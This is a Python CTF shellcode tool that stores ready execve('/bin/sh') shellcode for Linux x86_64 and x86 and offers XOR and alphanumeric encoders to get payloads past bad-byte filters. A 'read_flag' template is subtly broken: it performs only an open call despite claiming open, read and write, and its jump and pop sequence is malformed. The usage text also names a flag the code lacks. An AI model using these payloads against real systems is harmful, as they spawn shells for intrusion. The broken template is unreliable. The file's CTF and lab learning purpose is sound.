#!/usr/bin/env python3
"""
pwn/shellcode_encoder.py — Shellcode encoder/decoder & analysis for CTF
NuRichter · CySec Arsenal

Usage:
    python pwn/shellcode_encoder.py --encode --arch x86_64
    python pwn/shellcode_encoder.py --analyze --hex "48b801010101010101..."
    python pwn/shellcode_encoder.py --xor --hex "90909090..." --key 0x41
    python pwn/shellcode_encoder.py --template execve --arch x86_64
"""
import argparse
import struct
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))
from utils import ok, warn, err, info, found, get_logger

log = get_logger("shellcode_encoder")

# ─── Shellcode templates ──────────────────────────────────────────────────────
# Classic CTF shellcodes — for use in controlled lab environments ONLY

SHELLCODES = {
    "execve_x64": {
        "desc": "execve('/bin/sh', NULL, NULL) — Linux x86_64",
        "bytes": bytes([
            # xor rdi, rdi
            0x48, 0x31, 0xFF,
            # push rdi (null terminator)
            0x57,
            # movabs rsi, '/bin//sh'
            0x48, 0xBE, 0x2F, 0x62, 0x69, 0x6E, 0x2F, 0x2F, 0x73, 0x68,
            # push rsi
            0x56,
            # mov rdi, rsp (ptr to /bin//sh)
            0x48, 0x89, 0xE7,
            # xor rsi, rsi
            0x48, 0x31, 0xF6,
            # xor rdx, rdx
            0x48, 0x31, 0xD2,
            # mov rax, 59 (execve syscall)
            0x48, 0xC7, 0xC0, 0x3B, 0x00, 0x00, 0x00,
            # syscall
            0x0F, 0x05,
        ]),
    },
    "execve_x86": {
        "desc": "execve('/bin/sh', NULL, NULL) — Linux x86",
        "bytes": bytes([
            # xor eax, eax
            0x31, 0xC0,
            # push eax
            0x50,
            # push '//sh'
            0x68, 0x2F, 0x2F, 0x73, 0x68,
            # push '/bin'
            0x68, 0x2F, 0x62, 0x69, 0x6E,
            # mov ebx, esp
            0x89, 0xE3,
            # push eax
            0x50,
            # push ebx
            0x53,
            # mov ecx, esp
            0x89, 0xE1,
            # xor edx, edx
            0x31, 0xD2,
            # mov al, 11 (execve)
            0xB0, 0x0B,
            # int 0x80
            0xCD, 0x80,
        ]),
    },
    "read_flag_x64": {
        "desc": "open+read+write /flag → stdout — Linux x86_64 CTF",
        "bytes": bytes([
            # Simplified: open("/flag", O_RDONLY)
            # jmp short over the string
            0xEB, 0x0E,
            # '/flag\x00' string here
            0x2F, 0x66, 0x6C, 0x61, 0x67, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            # pop rdi (ptr to /flag)
            0x5F,
            # xor rsi, rsi (O_RDONLY=0)
            0x48, 0x31, 0xF6,
            # xor rdx, rdx
            0x48, 0x31, 0xD2,
            # mov rax, 2 (open syscall)
            0x48, 0xC7, 0xC0, 0x02, 0x00, 0x00, 0x00,
            # syscall
            0x0F, 0x05,
        ]),
    },
}


# ─── Encoder / Decoder ────────────────────────────────────────────────────────

def xor_encode(shellcode: bytes, key: int) -> bytes:
    """XOR encode shellcode with single-byte key."""
    return bytes(b ^ key for b in shellcode)


def alpha_encode(shellcode: bytes) -> bytes:
    """Naive alphanumeric encoding (expand each byte to printable sequence)."""
    result = bytearray()
    for byte in shellcode:
        hi = (byte >> 4) & 0xF
        lo = byte & 0xF
        result.append(ord('A') + hi)
        result.append(ord('A') + lo)
    return bytes(result)


def find_bad_bytes(shellcode: bytes, bad: list[int]) -> list[tuple[int, int]]:
    """Find positions of bad bytes in shellcode."""
    return [(i, b) for i, b in enumerate(shellcode) if b in bad]


# ─── Analysis ─────────────────────────────────────────────────────────────────

def analyze(shellcode: bytes) -> None:
    """Print statistics about shellcode."""
    print(info(f"Length   : {len(shellcode)} bytes"))
    print(info(f"Hex      : {shellcode.hex()}"))

    # Null byte check
    nulls = [i for i, b in enumerate(shellcode) if b == 0x00]
    if nulls:
        print(warn(f"NULL bytes at offsets: {nulls} (may break strcpy-based vulns)"))
    else:
        print(ok("No NULL bytes — safe for strcpy"))

    # Newline / space check
    for bad, name in [(0x0a, "\\n newline"), (0x0d, "\\r carriage return"),
                      (0x20, "space"), (0x09, "\\t tab")]:
        positions = [i for i, b in enumerate(shellcode) if b == bad]
        if positions:
            print(warn(f"Bad byte 0x{bad:02x} ({name}) at: {positions}"))

    # Byte frequency
    freq = {}
    for b in shellcode:
        freq[b] = freq.get(b, 0) + 1
    most_common = sorted(freq.items(), key=lambda x: x[1], reverse=True)[:5]
    print(info(f"Most frequent bytes: " +
               ", ".join(f"0x{b:02x}×{c}" for b, c in most_common)))

    # Entropy estimate
    import math
    total = len(shellcode)
    entropy = -sum((c/total) * math.log2(c/total) for c in freq.values())
    print(info(f"Entropy  : {entropy:.2f} bits/byte "
               f"({'high — looks encrypted/packed' if entropy > 7 else 'normal'})"))

    # Try disassembly if capstone is available
    try:
        import capstone
        arch = capstone.CS_ARCH_X86
        mode = capstone.CS_MODE_64
        md = capstone.Cs(arch, mode)
        print(info("\nDisassembly (x86_64):"))
        for insn in list(md.disasm(shellcode, 0x1000))[:20]:
            print(f"  0x{insn.address:04x}:  {insn.bytes.hex():<20}  {insn.mnemonic} {insn.op_str}")
    except ImportError:
        print(warn("capstone not installed — skipping disassembly (pip install capstone)"))


def format_output(shellcode: bytes, fmt: str) -> str:
    if fmt == "hex":
        return shellcode.hex()
    elif fmt == "python":
        return repr(shellcode)
    elif fmt == "c":
        parts = [f"\\x{b:02x}" for b in shellcode]
        return 'char shellcode[] = "' + "".join(parts) + '";'
    elif fmt == "asm":
        return ", ".join(f"0x{b:02x}" for b in shellcode)
    elif fmt == "base64":
        import base64
        return base64.b64encode(shellcode).decode()
    return shellcode.hex()


# ─── CLI ──────────────────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(
        description="Shellcode Encoder/Analyzer (CTF) — NuRichter CySec Arsenal"
    )
    parser.add_argument("--template",
                        choices=list(SHELLCODES.keys()) + ["list"],
                        help="Use a built-in shellcode template")
    parser.add_argument("--hex", default="",
                        help="Input shellcode as hex string")
    parser.add_argument("--analyze", action="store_true",
                        help="Analyze given shellcode")
    parser.add_argument("--xor", action="store_true",
                        help="XOR encode shellcode")
    parser.add_argument("--key", type=lambda x: int(x, 0), default=0x41,
                        help="XOR key byte (default: 0x41)")
    parser.add_argument("--alpha", action="store_true",
                        help="Alphanumeric encode")
    parser.add_argument("--bad-bytes", default="",
                        help="Comma-separated bad bytes e.g. 0x00,0x0a")
    parser.add_argument("--format", default="python",
                        choices=["python", "c", "hex", "asm", "base64"],
                        help="Output format (default: python)")
    args = parser.parse_args()

    print(f"\n{'='*60}")
    print("  Shellcode Encoder/Analyzer — NuRichter CySec Arsenal")
    print(f"{'='*60}\n")

    # List templates
    if args.template == "list":
        print(info("Available templates:"))
        for name, data in SHELLCODES.items():
            print(f"  {name:<22} — {data['desc']}")
        return

    # Load shellcode
    sc = b""
    if args.template and args.template != "list":
        sc = SHELLCODES[args.template]["bytes"]
        print(ok(f"Template: {args.template}"))
        print(info(SHELLCODES[args.template]["desc"]))
    elif args.hex:
        sc = bytes.fromhex(args.hex.replace(" ", "").replace("\\x", ""))
    else:
        parser.error("Specify --template or --hex")

    print(info(f"Input: {len(sc)} bytes\n"))

    # Bad byte check
    if args.bad_bytes:
        bad = [int(b.strip(), 0) for b in args.bad_bytes.split(",")]
        hits = find_bad_bytes(sc, bad)
        if hits:
            print(warn(f"Bad bytes found: " +
                       ", ".join(f"offset={i} 0x{b:02x}" for i, b in hits)))
        else:
            print(ok("No bad bytes found."))

    # XOR encode
    if args.xor:
        encoded = xor_encode(sc, args.key)
        print(found(f"XOR encoded (key=0x{args.key:02x}):"))
        print(f"  {format_output(encoded, args.format)}")
        print(info(f"Decode stub: xor each byte with 0x{args.key:02x}"))
        sc = encoded

    # Alpha encode
    if args.alpha:
        encoded = alpha_encode(sc)
        print(found("Alphanumeric encoded:"))
        print(f"  {encoded.decode()}")

    # Analyze
    if args.analyze or not (args.xor or args.alpha):
        print()
        analyze(sc)

    # Final output
    print(f"\n{found('Output (' + args.format + '):')} ")
    print(f"  {format_output(sc, args.format)}")
    print()


if __name__ == "__main__":
    main()
